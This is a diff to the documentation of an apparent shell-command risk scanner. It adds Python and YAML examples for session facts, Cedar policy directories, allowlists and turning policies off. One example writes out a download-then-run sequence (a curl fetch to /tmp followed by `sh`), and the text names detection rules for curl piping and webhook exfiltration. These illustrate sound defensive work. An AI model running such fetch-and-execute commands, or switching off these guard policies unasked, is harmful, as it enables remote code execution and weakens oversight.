@@ -132,23 +132,37 @@ it for every call.
 Some risks span commands: download a script now, run it later. Pass the `facts` of earlier
 commands of the same session; the policies see them, the model does not.
 
-```rust
-let mut session = Vec::new();
-for command in ["curl -so /tmp/i.sh https://example.org/i.sh", "sh /tmp/i.sh"] {
-    let verdict = scanner.shell_verdict(command, Some(&context), &session)?;
-    session.push(verdict.facts);
-}
-```
+=== "Rust"
+
+    ```rust
+    let mut session = Vec::new();
+    for command in ["curl -so /tmp/i.sh https://example.org/i.sh", "sh /tmp/i.sh"] {
+        let verdict = scanner.shell_verdict(command, Some(&context), &session)?;
+        session.push(verdict.facts);
+    }
+    ```
+
+=== "Python"
+
+    ```python
+    session = []
+    for command in ["curl -so /tmp/i.sh https://example.org/i.sh", "sh /tmp/i.sh"]:
+        verdict = scanner.shell_verdict(
+            command, cwd="/home/dev/app", prior_facts=session, with_facts=True
+        )
+        session.append(verdict["facts"])
+    ```
 
 The second command alone is `sh /tmp/i.sh`; with the first command's facts, `core.remote_to_exec`
 blocks it. The caller owns the session: keep the facts of the last commands per agent session and
-drop them when it ends.
-Python takes `cwd`, `home`, `repo_root` and `dialect`; `prior_facts` is Rust only for now.
+drop them when it ends. Python passes the `facts` dicts of earlier verdicts (`with_facts=True`)
+back unchanged; Rust parses such a JSON document with `Facts::from_json`.
 
 ## Write policies
 
 A user policy is a Cedar `forbid` in a `.cedar` file. Put the files in a directory and list it in
-`policy_dirs` (Core) or load it with `ShellPolicyConfig::add_cedar_dir` (full Ark).
+`policy_dirs`: the same key in the Core `shell` config, the full Ark gateway and the Ark API (see
+[Full Ark](#full-ark-the-shell_command-category)).
 
 ```cedar
 @id("user.no_kubectl_delete")
@@ -191,8 +205,8 @@ are examples of command-scope rules over `flows`.
 
 | Tier | Source | Can you change it? |
 | --- | --- | --- |
-| `core` | `core.cedar`, compiled in | No. Its levels come from the release's validation gate. |
-| `bundle-default` | DefenseClaw rules shipped with the release | Lower one from block to ask with the allowlist. |
+| `core` | `core.cedar`, compiled in | Its level, no; it comes from the release's validation gate. Turn it off with `rules`. |
+| `bundle-default` | DefenseClaw rules shipped with the release | Lower one from block to ask with the allowlist, or turn it off with `rules`. |
 | `user` | your `.cedar` files | Yes. |
 
 ```rust
@@ -201,30 +215,112 @@ shell.allowlist.insert("<bundle-default policy id>".into(), "ask".into());
 
 The allowlist accepts only loaded bundle-default ids and only `"ask"`.
 
+## Turn Cat policies on and off
+
+Every Cat policy id is an L1 rule id: `core.*`, the bundle-default ids such as `CMD-PIPE-CURL`, and
+your `user.*` ids. They sit in the same `rules` map as the PII, DLP and injection rules, with the
+same meaning: `false` turns the policy off, a missing id keeps it as loaded (on). A disabled policy
+never fires; the model still scores the command. The
+[L1 rule catalog](../reference/l1-rule-catalog.md#shell-command-policies-117) lists every shipped
+policy with its tier, scope and level.
+
+=== "Core Rust"
+
+    ```rust
+    let config = ScannerConfig {
+        gates: NativeGates {
+            rules: [("core.remote_to_exec", false), ("CMD-PIPE-CURL", false)]
+                .map(|(id, on)| (id.to_string(), on))
+                .into(),
+            ..NativeGates::default()
+        },
+        shell: Some(shell),
+        ..ScannerConfig::default()
+    };
+    ```
+
+=== "Core Python"
+
+    ```python
+    scanner = Scanner({
+        "rules": {"core.remote_to_exec": False, "CMD-PIPE-CURL": False, "user.ask_terraform": False},
+        "shell": {"bundle_dir": "/srv/models/cat-shell-risk-commander"},
+    })
+    ```
+
+=== "Ark Python"
+
+    ```python
+    gateway.set_execution_gates({"rules": {"core.remote_to_exec": False, "CMD-PIPE-CURL": False}})
+    # or per request: gateway.enqueue(command, ["shell_command"], execution_gates={"rules": {...}})
+    ```
+
+=== "Ark API"
+
+    ```yaml
+    pipeline:
+      gates:
+        rules:
+          core.remote_to_exec: false
+          CMD-PIPE-CURL: false
+    ```
+
+    A request overrides them with `config.gates.rules` (same keys).
+
+The allowlist and `rules` are independent: the allowlist lowers a bundle-default policy from block
+to ask, `rules` turns any policy off.
+
 ## Full Ark: the `shell_command` category
 
 In the full runtime, Cat is the category `shell_command`. The gateway downloads and pins the same
-bundle; set user policies on the gateway (Rust). Python: bundle policies only for now, without user
-`.cedar` files.
+bundle. User policies and the allowlist use the Core keys `policy_dirs` and `allowlist`; a loaded
+bundle applies them at once (a refused configuration changes nothing), otherwise `warmup` does.
 
-```rust
-use patronus_ark::{detectors::shell::ShellPolicyConfig, SecurityCategory, SecurityGateway, SecurityLevel};
+=== "Rust"
 
-let mut gateway = SecurityGateway::with_download_categories(
-    vec![SecurityCategory::Pii, SecurityCategory::Dlp, SecurityCategory::Injection, SecurityCategory::ShellCommand],
-    SecurityLevel::L1,
-    None,
-    true,
-    Some(vec![SecurityCategory::ShellCommand]),
-);
-let mut policies = ShellPolicyConfig::default();
-policies.add_cedar_dir("/etc/patronus/shell-policies".as_ref())?;
-gateway.set_shell_command_policy_config(policies)?; // before or after warmup
-gateway.warmup()?;
+    ```rust
+    use patronus_ark::{detectors::shell::ShellPolicyConfig, SecurityCategory, SecurityGateway, SecurityLevel};
 
-let result = &gateway.scan_categories(&[SecurityCategory::ShellCommand], "kubectl delete pod web-1")[0];
-let verdict = &result.layers[0].details["verdict"]; // the patronus.verdict/1 document
-```
+    let mut gateway = SecurityGateway::with_download_categories(
+        vec![SecurityCategory::Pii, SecurityCategory::Dlp, SecurityCategory::Injection, SecurityCategory::ShellCommand],
+        SecurityLevel::L1,
+        None,
+        true,
+        Some(vec![SecurityCategory::ShellCommand]),
+    );
+    let policies = ShellPolicyConfig::load(&["/etc/patronus/shell-policies"], &Default::default())?;
+    gateway.set_shell_command_policy_config(policies)?; // before or after warmup
+    gateway.warmup()?;
+
+    let result = &gateway.scan_categories(&[SecurityCategory::ShellCommand], "kubectl delete pod web-1")[0];
+    let verdict = &result.layers[0].details["verdict"]; // the patronus.verdict/1 document
+    ```
+
+=== "Python"
+
+    ```python
+    from patronus_ark import SecurityGateway
+
+    gateway = SecurityGateway(categories=["shell_command"], max_level="l1")
+    gateway.set_shell_command_policy_config(
+        policy_dirs=["/etc/patronus/shell-policies"],
+        allowlist={"C2-WEBHOOK-SITE": "ask"},
+    )  # ValueError on a refused configuration
+    gateway.warmup()
+    ```
+
+=== "Ark API"
+
+    ```yaml
+    pipeline:
+      categories: [shell_command]
+      max_level: L1
+      shell_command:
+        policy_dirs: [/etc/patronus/shell-policies]
+        allowlist: {C2-WEBHOOK-SITE: ask}
+    ```
+
+    The server reads the policies at startup and refuses to start on an invalid configuration.
 
 `class_name` is `shell_risk` for ask and block, `safe` for allow; the
 [result schema](../reference/result-schema.md#shell-command-results) lists the details. The category scan
